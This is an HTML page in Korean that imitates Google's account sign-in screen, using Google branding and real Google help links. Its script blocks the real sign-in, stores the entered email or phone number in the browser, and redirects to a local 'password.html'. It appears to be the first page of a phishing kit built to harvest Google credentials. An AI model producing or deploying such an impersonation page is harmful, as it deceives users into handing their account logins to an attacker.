<!doctype html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>로그인 - Google 계정</title>
  <style>
    body {
      margin: 0;
      background-color: #f7fafe;
      font-family: system-ui, sans-serif;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
      justify-content: center;
      align-items: center;
      font-size: 19px;
      font-weight: 300;
    }

    .container {
      width: 100%;
      max-width: 1000px;
      padding: 0 16px;
      box-sizing: border-box;
    }

    .card {
      background: white;
      border-radius: 1rem;
      display: flex;
      width: 100%;
      padding: 3rem 2rem 2.5rem;
      border: 1px solid #e5e7eb;
      box-sizing: border-box;
    }

    .left {
      flex: 1;
      padding-right: 1rem;
    }

    .logo {
      height: 48px;
      width: 48px;
      object-fit: contain;
    }

    .title {
      font-size: 2.25rem;
      margin-bottom: 1rem;
      font-weight: 400;
    }

    .subtitle {
      color: #4b5563;
      font-size: 1.125rem;
      font-weight: 500;
      margin-bottom: 0.5rem;
    }

    .right {
      flex: 1;
      padding-left: 1rem;
      display: flex;
      flex-direction: column;
    }

    .form {
      display: flex;
      flex-direction: column;
    }

    .input {
      border: 1px solid #9ca3af;
      border-radius: 0.5rem;
      padding: 1rem;
      font-size: 1.125rem;
      font-weight: 500;
      margin-bottom: 0.75rem;
      margin-top: 3.5rem;
      width: 100%;
      box-sizing: border-box;
    }

    .forgot-link {
      color: #1a73e8;
      text-decoration: none;
      font-size: 0.875rem;
      font-weight: 1000;
      margin-bottom: 2.5rem;
    }

    .info-text {
      color: #6b7280;
      font-size: 0.87rem;
      font-weight: 530;
      line-height: 1.5;
      margin-bottom: 2.5rem;
    }

    .info-link {
      color: #1a73e8;
      text-decoration: none;
      font-weight: 1000;
    }

    .buttons {
      display: flex;
      justify-content: flex-end;
      align-items: center;
      gap: 30px;
    }

    .create-account {
      color: #1a73e8;
      text-decoration: none;
      font-size: 1rem;
      font-weight: 700;
    }

    .next-btn {
      background: #1a73e8;
      color: white;
      border: none;
      padding: 0.5rem 1.5rem;
      border-radius: 9999px;
      font-size: 1rem;
      cursor: pointer;
    }

    .next-btn:hover {
      background: #1669c1;
    }

    .footer {
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-size: 0.75rem;
      font-weight: 700;
      color: #6b7280;
      width: 100%;
      max-width: 1200px;
      margin-top: 0.5rem;
      padding: 0 2rem;
      box-sizing: border-box;
    }

    .lang-select {
      display: flex;
      align-items: center;
      gap: 0.5rem;
      position: relative;
    }

    .lang-select select {
      background: transparent;
      border: none;
      cursor: pointer;
      font-size: 0.75rem;
      appearance: none;
      padding-right: 7rem;
      color: #6b7280;
    }

    .select-arrow {
      font-size: 0.75rem;
      pointer-events: none;
      color: #6b7280;
    }

    .footer-links {
      display: flex;
      gap: 1.5rem;
    }

    .footer-links a {
      color: #6b7280;
      text-decoration: none;
    }

    .footer-links a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="card">
      <div class="left">
        <img src="./img/glogo.png" alt="Logo" class="logo">
        <h1 class="title">로그인</h1>
        <p class="subtitle">Google 계정 사용</p>
      </div>
      <div class="right">
        <form class="form" id="email-form">
          <input type="text" id="email" class="input" placeholder="이메일 또는 휴대전화" required>
          <a href="https://accounts.google.com/signin/v2/usernamerecovery" class="forgot-link">이메일을 잊으셨나요?</a>
          <p class="info-text">
            내 컴퓨터가 아닌가요? 게스트 모드를 사용하여 비공개로 로그인하세요.
            <a href="https://support.google.com/chrome/answer/6130773?hl=ko" class="info-link">게스트 모드 사용 방법 자세히 알아보기</a>
          </p>
          <div class="buttons">
            <a href="https://accounts.google.com/lifecycle/steps/signup/name?continue=https://www.google.com/webhp?hl%3Dko%26sa%3DX%26ved%3D0ahUKEwjY1oGlhZWIAxWgk1YBHY5gK4YQPAgI&dsh=S386740314:1745871644730338&ec=GAZAmgQ&flowEntry=SignUp&flowName=GlifWebSignIn&hl=ko&ifkv=ASKV5Mh71FoJqyhltz1ZOCpqgY8TvkXzlHn2zx9WQFZoGWm3lrEejIDDw1Zwmg2UMzgr5W2C4ChGMg&TL=AArrULTELkv-Dl6hA9CCt5J0Jh_lnLJ7EEvQB6j5_MDeczeTT92WSh4nsRJKIBDc" class="create-account">계정 만들기</a>
            <button type="submit" class="next-btn">다음</button>
          </div>
        </form>
      </div>
    </div>

    <footer class="footer">
      <div class="lang-select">
        <select>
          <option selected>한국어</option>
        </select>
        <span class="select-arrow">▼</span>
      </div>
      <div class="footer-links">
        <a href="https://support.google.com/accounts?hl=ko">도움말</a>
        <a href="https://policies.google.com/privacy?hl=ko">개인정보처리방침</a>
        <a href="https://policies.google.com/terms?hl=ko">약관</a>
      </div>
    </footer>
  </div>

  <script>
    document.getElementById("email-form").addEventListener("submit", function(e) {
      e.preventDefault();
      const email = document.getElementById("email").value;
      localStorage.setItem("user_email", email);
      window.location.href = "password.html";
    });
  </script>

</body>
</html>
